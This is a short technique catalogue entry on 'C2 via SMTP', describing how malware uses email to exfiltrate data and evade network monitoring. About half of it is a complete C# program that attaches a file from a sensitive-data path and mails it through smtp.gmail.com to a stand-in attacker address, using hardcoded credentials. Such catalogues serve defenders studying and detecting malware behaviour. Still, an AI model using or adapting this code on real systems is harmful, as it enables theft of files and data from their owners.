# Technique Name: **C2 via SMTP**

## Author Information

- Nickname: tasdir
- First Name: Tasdir
- Last Name: Ahmmed
- Email: Optional
- GitHub: https://github.com/tasdir
- Twitter: https://x.com/tasdir_x
- LinkedIn: https://www.linkedin.com/in/tasdir/

## Technique Information

- Technique Category: U0910
- Technique Tags: SMTP,C2,Data Exfiltration,Encrypted Emails
- Technique General Detail: 

```
C2 via SMTP is a technique where attackers leverage the Simple Mail Transfer Protocol (SMTP) to establish command and control communication or to exfiltrate data. By utilizing email messages, an attacker sends stolen data via emails to a controlled email account. This method is often used to bypass traditional network monitoring solutions since SMTP traffic is generally considered benign.
To implement C2 via SMTP, attackers embed hardcoded credentials within malware to connect to an email server. The malware sends exfiltrated data, such as stolen files or system information, as attachments via email. SMTP providers, such as Gmail or Outlook, can be misused to act as intermediaries for C2 traffic, making the communication harder to detect. Additionally, attackers may use SSL/TLS encryption to secure emails, further complicating detection efforts.

```



##Featured Windows API's: SmtpClient (C# libraries) , System.Net.Mail.MailMessage , System.IO (file handling for attachments)

## Code Snippet
'''
using System;
using System.IO;
using System.Net;
using System.Net.Mail;

class C2ViaSMTP
{
    static void Main()
    {
        // Target file exfiltrate
        string targetFilePath = @"C:\SensitiveData\report.pdf";
        string emailRecipient = "attacker@example.com";
        string attackerEmail = "malwarebot@gmail.com";
        string attackerPassword = "maliciouspassword123";

        try
        {
            // Send data as a email message
            MailMessage message = new MailMessage();
            message.From = new MailAddress(attackerEmail);
            message.To.Add(emailRecipient);
            message.Subject = "Exfiltrated Data";
            message.Body = "Attached file contains sensitive exfiltrated data.";
            
            // Add target file as attachment
            Attachment attachment = new Attachment(targetFilePath);
            message.Attachments.Add(attachment);

            // Configure SMTP client
            SmtpClient smtpClient = new SmtpClient("smtp.gmail.com")
            {
                Port = 587,
                Credentials = new NetworkCredential(attackerEmail, attackerPassword),
                EnableSsl = true
            };

            // Send email
            smtpClient.Send(message);
            Console.WriteLine("Data exfiltration email sent successfully.");
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error: " + ex.Message);
        }
    }
}

'''

